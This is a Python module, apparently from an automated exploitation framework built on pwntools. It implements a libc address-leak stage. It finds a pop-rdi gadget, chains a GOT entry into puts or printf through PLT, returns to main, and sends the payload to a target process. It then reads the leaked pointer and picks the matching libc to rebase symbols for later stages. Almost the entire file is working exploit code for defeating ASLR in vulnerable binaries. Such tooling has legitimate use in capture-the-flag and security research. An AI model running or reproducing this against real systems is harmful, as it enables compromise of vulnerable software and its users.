import tempfile
import typing
from typing import Optional
from pwnlib.elf import ELF

from abstract.module import AbstractModule
from core.libc_finder import LocalLibcFinder, default_filter
from core.targetbase import TargetBase
from pwn import p64, u64

from modules.find_function import FindFunction, Method


class GetLibcAddress(AbstractModule):
    DEFAULT_PRINT_FUNCTIONS = ["puts", "printf"]

    @classmethod
    def execute(cls, target: TargetBase, target_functions: Optional[typing.List[str]] = None, print_function: Optional[str] = None,
                handler: typing.Callable = None, *args, **kwargs) -> Optional:
        cls.logger.info(f"Running {cls.__name__} module")
        cls.logger.info("Looking for a print function")
        if not print_function:
            print_function = cls.DEFAULT_PRINT_FUNCTIONS
        result = FindFunction.execute(target, print_function, Method.PLT)
        if not result:
            cls.logger.critical(f"Failed to get a print function")
            return None
        print_function_name, print_function_address = result
        if not target_functions:
            target_functions = cls.DEFAULT_PRINT_FUNCTIONS
        result = FindFunction.execute(target, target_functions, Method.GOT)
        if not result:
            cls.logger.critical(f"Failed to find the target function")
            return None
        target_function_name, target_function_address = result
        pop_rdi = target.rop.find_gadget(['pop rdi', 'ret']).address

        rop_chain = (
                p64(pop_rdi) +
                p64(target_function_address) +
                p64(print_function_address) +
                p64(target.main)
        )
        payload = target.create_payload(rop_chain)

        cls.logger.info(f"Sending payload. Payload size = {hex(len(payload))}")
        if handler:
            handler(target, payload)
        else:
            target.run_main(payload)
        data = target.process.recvline()
        data = data.strip(b'\n')
        if len(data) > 8:
            cls.logger.critical("Unexpected number of bytes received")
            return None
        result = u64(data.ljust(8, b'\0'))
        cls.logger.success(f"Leaked libc address: {target_function_name}@{hex(result)}")
        return result

    @classmethod
    def libc_update_base_address(cls, target: TargetBase, functions: typing.List[typing.Tuple[str, int]],
                                 custom_filter: typing.Callable = default_filter):
        if target.libc_hint:
            lib_name = target.libc_hint
            data, base = LocalLibcFinder.get_lib_by_name(target.libc_hint, functions)
        else:
            possible_libs = LocalLibcFinder.find_lib(functions, custom_filter)
            if not possible_libs:
                cls.logger.critical(f"Failed to find libc")
                return False
            lib_name, (data, base) = possible_libs.popitem()

        tmp_file = tempfile.NamedTemporaryFile('wb')
        cls.logger.info(f"Saving {lib_name} to {tmp_file.name}")
        tmp_file.write(data)
        tmp_file.flush()
        cls.logger.info(f"Parsing libc symbols...")
        target.libc = ELF(tmp_file.name)
        target.libc.address = base
        cls.logger.info(f"Using library: {lib_name}@{hex(base)}")
        return True
